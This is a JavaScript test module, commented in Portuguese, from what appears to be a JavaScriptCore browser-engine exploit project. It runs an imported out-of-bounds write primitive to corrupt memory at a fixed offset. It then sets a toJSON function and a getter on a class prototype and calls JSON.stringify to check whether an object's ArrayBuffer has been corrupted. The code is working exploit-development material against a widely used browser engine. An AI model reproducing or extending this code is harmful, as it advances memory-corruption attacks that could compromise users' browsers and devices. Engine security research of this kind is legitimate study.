// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterOnComplex"; // Getter será em ComplexCheckpoint
let getter_called_flag = false;
let current_test_results = { success: false, message: "Teste não iniciado.", error: null, details: "" };

const CORRUPTION_OFFSET = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

class ComplexCheckpoint {
    constructor(id) {
        this.id_marker = `ComplexCheckpointInstance-${id}`;
        this.numeric_prop = 0x11223344;
        this.string_prop = "InitialString";
        this.object_prop = { a: 10, b: 20 };
        this.array_prop = [100, 200, 300];
        try {
            this.arraybuffer_prop = new ArrayBuffer(32); // Um ArrayBuffer como propriedade
            new DataView(this.arraybuffer_prop).setUint32(0, 0xABABABAB, true);
        } catch (e) {
            logS3(`Erro ao criar arraybuffer_prop no construtor: ${e.message}`, "error", "ComplexCheckpoint");
            this.arraybuffer_prop = null;
        }
        // A propriedade GETTER_CHECKPOINT_PROPERTY_NAME será adicionada ao protótipo
    }

    // Um método simples para verificar integridade básica se necessário
    checkSelf() {
        return `ID: ${this.id_marker}, AB Prop: ${this.arraybuffer_prop ? this.arraybuffer_prop.byteLength : 'null'}`;
    }
}

export function toJSON_TriggerComplexGetter() { // Esta será a toJSON de ComplexCheckpoint
    const FNAME_toJSON = "toJSON_TriggerComplexGetter";
    logS3(`toJSON_TriggerComplexGetter para: ${this.id_marker}. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
    try {
        // eslint-disable-next-line no-unused-vars
        const val = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter no próprio this
    } catch (e) {
        logS3(`toJSON_TriggerComplexGetter: Erro ao acessar getter: ${e.message}`, "error", FNAME_toJSON);
    }
    // Para JSON.stringify continuar, ele precisa de um objeto serializável ou valor primitivo.
    // Retornar apenas algumas propriedades para evitar recursão infinita se algo estiver muito quebrado.
    return {
        id: this.id_marker,
        processed_by: FNAME_toJSON
    };
}

export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
    const FNAME_TEST = "executeComplexCheckpointTest"; // Nome interno
    logS3(`--- Iniciando Teste com Checkpoint_obj Complexo ---`, "test", FNAME_TEST);

    getter_called_flag = false;
    current_test_results = { success: false, message: "Teste não executado.", error: null, details: "" };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { /* ... validação ... */ return; }

    let toJSONPollutionAppliedOnProto = false; // Não vamos poluir Object.prototype desta vez
    let getterPollutionAppliedOnProto = false;
    let originalToJSONComplexProtoDesc = null;
    let originalGetterDesc = null;

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { /* ... erro ... */ return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        // 1. Realizar a escrita OOB "gatilho" no oob_array_buffer_real
        oob_write_absolute(CORRUPTION_OFFSET, CORRUPTION_VALUE, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET)} do oob_data completada.`, "info", FNAME_TEST);

        // 2. Criar e configurar o ComplexCheckpoint
        const complex_checkpoint_obj = new ComplexCheckpoint(1);
        logS3(`ComplexCheckpoint objeto criado. ID: ${complex_checkpoint_obj.id_marker}, AB Length: ${complex_checkpoint_obj.arraybuffer_prop?.byteLength}`, "info", FNAME_TEST);

        // Salvar descritores originais do protótipo de ComplexCheckpoint
        originalToJSONComplexProtoDesc = Object.getOwnPropertyDescriptor(ComplexCheckpoint.prototype, 'toJSON');
        originalGetterDesc = Object.getOwnPropertyDescriptor(ComplexCheckpoint.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);

        // Definir toJSON e o getter diretamente no protótipo de ComplexCheckpoint
        Object.defineProperty(ComplexCheckpoint.prototype, 'toJSON', {
            value: toJSON_TriggerComplexGetter,
            writable: true, enumerable: false, configurable: true
        });
        toJSONPollutionAppliedOnProto = true;

        Object.defineProperty(ComplexCheckpoint.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
            get: function() { // Getter SÍNCRONO
                getter_called_flag = true;
                const FNAME_GETTER = "ComplexCheckpoint_Getter";
                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
                
                let details = [];
                let corruption_found = false;
                try {
                    details.push(`ID: ${this.id_marker} (Esperado: ComplexCheckpointInstance-1)`);
                    details.push(`Numeric Prop: ${toHex(this.numeric_prop)} (Esperado: ${toHex(0x11223344)})`);
                    details.push(`String Prop: "${this.string_prop}" (Esperado: "InitialString")`);
                    details.push(`Object Prop Keys: ${this.object_prop ? Object.keys(this.object_prop).join(',') : 'null'} (Esperado: a,b)`);
                    details.push(`Array Prop Length: ${this.array_prop ? this.array_prop.length : 'null'} (Esperado: 3)`);
                    
                    if (this.arraybuffer_prop) {
                        details.push(`AB Prop byteLength: ${this.arraybuffer_prop.byteLength} (Esperado: 32)`);
                        if (this.arraybuffer_prop.byteLength !== 32) {
                            corruption_found = true;
                            logS3("CORRUPÇÃO: this.arraybuffer_prop.byteLength alterado!", "vuln", FNAME_GETTER);
                        }
                        try {
                            const dv = new DataView(this.arraybuffer_prop);
                            details.push(`AB Prop[0] (u32): ${toHex(dv.getUint32(0,true))} (Esperado: ${toHex(0xABABABAB)})`);
                            if (dv.getUint32(0,true) !== 0xABABABAB) {
                                corruption_found = true;
                                logS3("CORRUPÇÃO: Conteúdo de this.arraybuffer_prop alterado!", "vuln", FNAME_GETTER);
                            }
                        } catch (e_dv) {
                            details.push(`AB Prop: Erro ao usar DataView: ${e_dv.message}`);
                            corruption_found = true;
                            logS3(`CORRUPÇÃO: Erro ao usar DataView em this.arraybuffer_prop: ${e_dv.message}`, "vuln", FNAME_GETTER);
                        }
                    } else {
                        details.push("AB Prop é null!");
                        corruption_found = true; // Se era esperado e agora é null
                         logS3("CORRUPÇÃO: this.arraybuffer_prop é null!", "vuln", FNAME_GETTER);
                    }

                    if (corruption_found) {
                        current_test_results = { success: true, message: "Corrupção observada nas propriedades de ComplexCheckpoint!", error: null, details: details.join('; ') };
                    } else {
                        current_test_results = { success: false, message: "Nenhuma corrupção óbvia nas propriedades de ComplexCheckpoint.", error: null, details: details.join('; ') };
                    }

                } catch (e) {
                    logS3(`DENTRO DO GETTER: ERRO GERAL ao inspecionar 'this': ${e.message}`, "error", FNAME_GETTER);
                    current_test_results = { success: false, message: `Erro geral inspecionando 'this': ${e.message}`, error: String(e), details: details.join('; ') };
                }
                return 0xBADF00D; // Getter precisa retornar algo
            },
            configurable: true
        });
        getterPollutionAppliedOnProto = true;
        logS3(`toJSON e getter definidos no protótipo de ComplexCheckpoint.`, "info", FNAME_TEST);

        // 3. Chamar JSON.stringify no objeto complexo
        logS3(`Chamando JSON.stringify(complex_checkpoint_obj)...`, "info", FNAME_TEST);
        let stringify_result = null;
        try {
            stringify_result = JSON.stringify(complex_checkpoint_obj);
            logS3(`JSON.stringify completado. Resultado: ${stringify_result}`, "info", FNAME_TEST);
        } catch (e) {
            logS3(`Erro JSON.stringify: ${e.message}`, "error", FNAME_TEST);
            if (!getter_called_flag) { // Se o erro ocorreu antes do getter
                 current_test_results.message = `Erro em JSON.stringify antes do getter: ${e.message}`;
                 current_test_results.error = String(e);
            }
        }

    } catch (mainError) {
        logS3(`Erro principal: ${mainError.message}`, "critical", FNAME_TEST);
        console.error(mainError);
        current_test_results = { success: false, message: `Erro crítico: ${mainError.message}`, error: String(mainError), details:"" };
    } finally {
        // Restauração
        if (toJSONPollutionAppliedOnProto && ComplexCheckpoint.prototype.hasOwnProperty('toJSON')) {
            delete ComplexCheckpoint.prototype.toJSON;
            if(originalToJSONComplexProtoDesc) Object.defineProperty(ComplexCheckpoint.prototype, 'toJSON', originalToJSONComplexProtoDesc);
        }
        if (getterPollutionAppliedOnProto && ComplexCheckpoint.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) {
             delete ComplexCheckpoint.prototype[GETTER_CHECKPOINT_PROPERTY_NAME];
            if(originalGetterDesc) Object.defineProperty(ComplexCheckpoint.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, originalGetterDesc);
        }
        logS3("Limpeza de protótipo de ComplexCheckpoint finalizada.", "info", "CleanupFinal");
    }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE COMPLEX CHECKPOINT: ${current_test_results.message}`, "vuln", FNAME_TEST);
        } else {
            logS3(`RESULTADO TESTE COMPLEX CHECKPOINT: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST);
        }
        logS3(`Detalhes da inspeção do ComplexCheckpoint: ${current_test_results.details}`, "info", FNAME_TEST);
    } else {
        logS3("RESULTADO TESTE COMPLEX CHECKPOINT: Getter NÃO foi chamado.", "error", FNAME_TEST);
    }
    // logS3(`  Detalhes finais JSON: ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);

    clearOOBEnvironment();
    logS3(`--- Teste com Checkpoint_obj Complexo Concluído ---`, "test", FNAME_TEST);
}
